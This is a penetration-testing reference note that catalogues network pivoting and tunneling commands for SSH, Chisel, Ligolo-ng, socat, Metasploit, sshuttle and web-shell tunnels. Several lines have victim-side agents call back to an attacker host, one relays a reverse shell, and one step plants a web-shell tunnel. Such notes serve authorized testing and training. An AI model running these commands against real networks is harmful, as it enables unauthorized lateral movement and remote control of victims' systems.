---
title: "Network Pivoting Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - pivoting
  - tunneling
  - chisel
  - ligolo
  - socks
  - ssh
---

# Network Pivoting Reference

Reference for network pivoting, tunneling, and port forwarding techniques. See also: [[Windows-Persistence-Reference]], [[Linux-Persistence-Reference]], [[Container-Security-Reference]].

---

## Table of Contents

- [[#SOCKS Proxy Compatibility]]
- [[#Proxychains]]
- [[#netsh Port Forwarding (Windows)]]
- [[#SSH Tunneling]]
- [[#Chisel]]
- [[#Ligolo-ng]]
- [[#Metasploit Autoroute]]
- [[#sshuttle]]
- [[#reGeorg / pivotnacci]]
- [[#Graftcp]]
- [[#Socat]]
- [[#Double Pivot]]

---

## SOCKS Proxy Compatibility

| Tool | SOCKS4 | SOCKS5 | Notes |
|------|--------|--------|-------|
| Proxychains | Yes | Yes | Config: /etc/proxychains.conf |
| nmap | Yes (-sT only) | Yes | No SYN scans |
| netexec | Yes | Yes | Use --proxy |
| impacket | Yes | Yes | Via proxychains |
| Burp Suite | Yes | Yes | External proxy settings |
| Metasploit | Yes | Yes | Built-in or proxychains |
| curl | Yes | Yes | --socks5-hostname |
| wget | No | Yes | Via env variables |
| Firefox | Yes | Yes | FoxyProxy recommended |

---

## Proxychains

```bash
# Configuration
cat /etc/proxychains.conf
# Add at bottom:
socks5  127.0.0.1 1080
socks4  127.0.0.1 1080

# Usage
proxychains nmap -sT -Pn <TARGET_IP>
proxychains impacket-psexec corp.local/administrator@<TARGET_IP>
proxychains netexec smb <TARGET_CIDR>

# Proxychains4 with dynamic chain (multiple hops)
# /etc/proxychains.conf: dynamic_chain
```

---

## netsh Port Forwarding (Windows)

```powershell
# Forward local port to remote port (requires admin)
netsh interface portproxy add v4tov4 listenport=<LOCAL_PORT> listenaddress=0.0.0.0 connectport=<REMOTE_PORT> connectaddress=<REMOTE_IP>

# Example: forward local 8080 to internal 192.168.1.100:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100

# View existing rules
netsh interface portproxy show all

# Delete rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Allow firewall
netsh advfirewall firewall add rule name="PortForward8080" dir=in action=allow protocol=TCP localport=8080
```

---

## SSH Tunneling

### Local Port Forwarding (-L)
Forward a local port to a remote target through the SSH server.
```
Attacker:LOCAL_PORT → SSH_SERVER → REMOTE_HOST:REMOTE_PORT
```

```bash
# Access internal service via SSH jump
ssh -L <LOCAL_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT> user@<SSH_SERVER>

# Example: access internal RDP at 192.168.1.100:3389 via pivot at 10.10.10.5
ssh -L 3389:192.168.1.100:3389 user@10.10.10.5
# Connect to RDP: mstsc /v:127.0.0.1:3389
```

### Remote Port Forwarding (-R)
Forward a remote port on SSH server back to attacker (useful for reverse connections).

```bash
# Expose local service on remote server
ssh -R <REMOTE_PORT>:<LOCAL_HOST>:<LOCAL_PORT> user@<SSH_SERVER>

# Example: expose attacker C2 on pivot
ssh -R 4444:127.0.0.1:4444 user@10.10.10.5
```

### Dynamic Port Forwarding / SOCKS (-D)
Create SOCKS proxy through SSH connection.

```bash
# Create SOCKS5 proxy on local port 1080
ssh -D 1080 user@<SSH_SERVER>
ssh -D 1080 -N -f user@<SSH_SERVER>   # Background + no command

# Add to proxychains:
echo "socks5  127.0.0.1 1080" >> /etc/proxychains.conf

# Use
proxychains nmap -sT -Pn 192.168.1.0/24
```

### SSH Flags

```bash
-N    # No remote command (tunneling only)
-f    # Background after authentication
-C    # Compression
-q    # Quiet
-T    # No TTY allocation
-o StrictHostKeyChecking=no
-o UserKnownHostsFile=/dev/null
```

### Multi-Hop SSH

```bash
# Jump through multiple hosts
ssh -J user1@jump1,user2@jump2 user3@final_target

# ProxyJump in .ssh/config
Host final
    HostName final_target
    User user3
    ProxyJump jump1,jump2
```

---

## Chisel

Fast TCP/UDP tunnel over HTTP. Client connects to server, creates SOCKS proxy or specific port forwards.

### Download

```bash
# Attacker (server)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel && chmod +x chisel

# Victim (client) - transfer chisel binary
# Windows: SharpChisel or chisel.exe
```

### SOCKS Proxy (Most common)

```bash
# Step 1: Attacker starts server
./chisel server --reverse --port 8080

# Step 2: Victim runs client
./chisel client <ATTACKER_IP>:8080 R:socks

# Now attacker has SOCKS5 proxy at 127.0.0.1:1080
# Add to proxychains.conf: socks5 127.0.0.1 1080
```

### Specific Port Forward

```bash
# Forward attacker's port 9090 to target's 192.168.1.100:80
# Attacker server
./chisel server --reverse --port 8080

# Victim client
./chisel client <ATTACKER_IP>:8080 R:9090:192.168.1.100:80

# Access: curl http://127.0.0.1:9090
```

### Local-to-Remote Tunnel

```bash
# Victim can access attacker's services
./chisel server --port 8080   # On victim
./chisel client <VICTIM_IP>:8080 3306:127.0.0.1:3306   # Attacker connects

# Victim now has access to attacker's MySQL at 127.0.0.1:3306
```

### SharpChisel (Windows .NET)

```powershell
.\SharpChisel.exe client <ATTACKER_IP>:8080 R:socks
.\SharpChisel.exe client <ATTACKER_IP>:8080 R:1080:socks
```

---

## Ligolo-ng

Reverse VPN tunnel. Creates a TUN interface on attacker, allowing routing to pivot networks as if directly connected. More powerful than SOCKS.

### Setup (Attacker)

```bash
# Download
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64.tar.gz

# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy (attacker)
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

### Setup (Victim / Agent)

```bash
# Linux agent
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# Windows agent
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

### Using the Tunnel (Attacker Proxy Interface)

```
ligolo-ng » session      # List sessions
ligolo-ng » [0] » start  # Start tunnel for session 0

# Add route to internal network (in separate terminal)
sudo ip route add 192.168.1.0/24 dev ligolo

# Now you can access 192.168.1.0/24 directly!
nmap -sV 192.168.1.0/24
impacket-psexec corp.local/administrator@192.168.1.100
```

### Double Pivot with Ligolo-ng

```bash
# Step 1: Set up first pivot (Pivot1 can reach 10.0.1.0/24)
# Pivot1 has agent running, tunnel to attacker
sudo ip route add 10.0.1.0/24 dev ligolo  # Attacker adds route

# Step 2: Create listener on Pivot1 to catch Pivot2's agent
ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# This listens on Pivot1:11601 and forwards to attacker's proxy

# Step 3: From Pivot1, deploy agent to Pivot2
# Pivot2 runs: agent -connect <PIVOT1_IP>:11601 -ignore-cert

# Step 4: Attacker sees new session for Pivot2
ligolo-ng » session  # New session appears
ligolo-ng » [1] » start

# Step 5: Add routes for Pivot2's network
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 172.16.0.0/24 dev ligolo2
```

---

## Metasploit Autoroute

```
# In meterpreter session:
run autoroute -s 192.168.1.0/24
run autoroute -p   # Print routes

# Background session and use SOCKS proxy
background
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Use proxychains
proxychains nmap -sT -Pn 192.168.1.0/24

# Port forward via meterpreter
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_HOST>
portfwd list
portfwd delete -l <LOCAL_PORT>
```

---

## sshuttle

Transparent proxy via SSH. Routes specified subnets through SSH tunnel without proxychains.

```bash
# Install
pip3 install sshuttle
apt install sshuttle

# Route specific subnet
sshuttle -r user@<SSH_SERVER> 192.168.1.0/24

# Route all traffic
sshuttle -r user@<SSH_SERVER> 0.0.0.0/0

# With SSH key
sshuttle -r user@<SSH_SERVER> --ssh-cmd "ssh -i keyfile" 192.168.1.0/24

# Exclude specific subnets
sshuttle -r user@<SSH_SERVER> 192.168.1.0/24 -x 192.168.1.100

# Background
sshuttle -r user@<SSH_SERVER> 192.168.1.0/24 --daemon

# DNS through tunnel
sshuttle -r user@<SSH_SERVER> 192.168.1.0/24 --dns
```

---

## reGeorg / pivotnacci

HTTP/HTTPS-based SOCKS tunneling via web shell. Useful when only HTTP access is available to pivot.

### reGeorg

```bash
# Upload tunnel.ashx (ASP.NET), tunnel.jsp (Java), tunnel.php (PHP), etc. to web server

# Start local SOCKS proxy
python3 reGeorgSocksProxy.py -p 1080 -u http://<WEBSERVER>/tunnel.php

# Use with proxychains
proxychains nmap -sT -Pn 192.168.1.0/24
```

### pivotnacci

```bash
# Similar concept - HTTP tunnel
pip3 install pivotnacci

# Upload agent to web server
# Start listener
pivotnacci http://<WEBSERVER>/agent.php -D 1080

# Proxychains
proxychains nmap -sT -Pn 192.168.1.0/24
```

---

## Graftcp

Routes arbitrary TCP connections through SOCKS proxy using ptrace (Linux only).

```bash
# Install
git clone https://github.com/hmgle/graftcp
cd graftcp && make

# Start local SOCKS proxy first (e.g., via chisel or SSH)
# Use graftcp to force any program through it
./graftcp-local -listen :2233 -socks5 127.0.0.1:1080 &
./graftcp nmap -sV 192.168.1.1
```

---

## Socat

Swiss army knife for TCP/UDP/SOCKS forwarding.

```bash
# TCP port forward
socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<REMOTE_HOST>:<REMOTE_PORT>

# Example: forward local 8080 to internal 192.168.1.100:80
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# Reverse shell relay
socat TCP-LISTEN:9999,fork TCP:<ATTACKER_IP>:4444 &
# Target connects to pivot:9999, relay to attacker:4444

# UDP forward
socat UDP-LISTEN:<PORT>,fork UDP:<REMOTE>:<PORT>
```

---

## Double Pivot

When the attacker needs to traverse two network segments.

```
Attacker → Pivot1 (dual-homed) → Pivot2 (dual-homed) → Target
  .1.x          .1.x / .2.x           .2.x / .3.x         .3.x
```

### Via SSH

```bash
# Step 1: SSH SOCKS through Pivot1
ssh -D 1080 -N user@Pivot1
proxychains ssh -D 1081 -N user@Pivot2
# proxychains uses port 1080 (via Pivot1) to reach Pivot2
# Port 1081 = SOCKS to internal network .3.x
```

### Via Chisel

```bash
# Attacker starts server
./chisel server --reverse --port 8080

# Pivot1 connects to attacker + relays for Pivot2
./chisel client <ATTACKER_IP>:8080 R:8888:0.0.0.0:8888 R:socks

# Pivot2 connects to Pivot1 (Pivot1 relays to attacker)
./chisel client <PIVOT1_IP>:8888 R:socks

# Attacker now has SOCKS proxies:
# 127.0.0.1:1080 → Pivot1's network
# 127.0.0.1:1081 → Pivot2's network (via second R:socks session)
```
